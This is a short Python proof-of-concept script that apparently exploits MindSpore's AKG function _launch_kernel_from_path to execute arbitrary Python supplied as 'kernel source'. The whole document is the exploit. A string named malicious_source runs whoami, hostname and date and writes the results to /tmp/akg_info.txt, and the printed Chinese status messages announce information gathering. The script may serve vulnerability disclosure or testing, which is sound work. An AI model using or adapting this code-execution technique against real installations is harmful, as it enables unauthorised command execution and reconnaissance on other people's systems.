import os
import sys
sys.path.insert(0, '/usr/local/lib/python3.10/dist-packages/mindspore/_akg')
os.environ['LD_LIBRARY_PATH'] = '/usr/local/lib/python3.10/dist-packages/mindspore/lib/plugin/cpu:' + os.environ.get('LD_LIBRARY_PATH', '')

try:
    from akg.composite.topi import _launch_kernel_from_path
except:
    from mindspore._akg.akg.composite.topi import _launch_kernel_from_path

import tvm
x = tvm.placeholder((3,), name='x', dtype='float32')
inputs = [x]
op_attrs = {}

malicious_source = '''
import os, subprocess, datetime
info = f"User: {os.popen('whoami').read().strip()}\\nHost: {os.popen('hostname').read().strip()}\\nTime: {subprocess.check_output(['date']).decode().strip()}"
with open("/tmp/akg_info.txt", "w") as f:
    f.write(info)
print("[+] 收集完成")
def evil_func(*args):
    return args[0] if args else None
'''

func_name = "evil_func"
func_type = "ir_builder"

print("[*] 信息收集...")
result = _launch_kernel_from_path(inputs, op_attrs, func_type, malicious_source, func_name)
print("[*] 完成")